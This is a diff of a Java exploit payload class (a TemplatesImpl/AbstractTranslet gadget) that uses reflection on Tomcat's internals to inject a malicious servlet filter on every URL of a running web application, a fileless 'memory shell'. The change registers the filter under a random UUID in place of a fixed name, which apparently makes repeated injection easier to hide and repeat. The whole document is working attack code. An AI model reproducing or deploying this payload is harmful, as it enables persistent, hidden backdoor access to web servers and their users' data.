@@ -16,6 +16,7 @@ import javax.servlet.ServletContext;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.EnumSet;
+import java.util.UUID;
 
 public class TemplatesImplPayload3 extends AbstractTranslet {
 
@@ -24,32 +25,25 @@ public class TemplatesImplPayload3 extends AbstractTranslet {
             WebappClassLoaderBase classLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
             StandardContext standardContext = (StandardContext) classLoader.getResources().getContext();
             ServletContext servletContext = standardContext.getServletContext();
-            Filter filter = (Filter) classLoader.loadClass("com.xhstormr.app.FilterImpl").newInstance();
-            String filterName = "leoleo";
-            System.out.println(filter);
 
-            if (servletContext.getFilterRegistration(filterName) == null) {
-                Field stateField = LifecycleBase.class.getDeclaredField("state");
-                try {
-                    stateField.setAccessible(true);
-                    stateField.set(standardContext, LifecycleState.STARTING_PREP);
+            Field stateField = LifecycleBase.class.getDeclaredField("state");
+            try {
+                stateField.setAccessible(true);
+                stateField.set(standardContext, LifecycleState.STARTING_PREP);
 
-                    servletContext
-                            .addFilter(filterName, filter)
-                            .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");
+                servletContext
+                        .addFilter(UUID.randomUUID().toString(), (Class<Filter>) classLoader.loadClass("com.xhstormr.app.FilterImpl"))
+                        .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");
 
-                    stateField.set(standardContext, LifecycleState.STARTED);
+                stateField.set(standardContext, LifecycleState.STARTED);
 
-                    Method filterStartMethod = StandardContext.class.getMethod("filterStart");
-                    filterStartMethod.setAccessible(true);
-                    filterStartMethod.invoke(standardContext);
-                } catch (Exception e) {
-                    e.printStackTrace();
-                } finally {
-                    stateField.set(standardContext, LifecycleState.STARTED);
-                }
-            } else {
-                System.out.println("already done");
+                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
+                filterStartMethod.setAccessible(true);
+                filterStartMethod.invoke(standardContext);
+            } catch (Exception e) {
+                e.printStackTrace();
+            } finally {
+                stateField.set(standardContext, LifecycleState.STARTED);
             }
         } catch (Exception e) {
             e.printStackTrace();
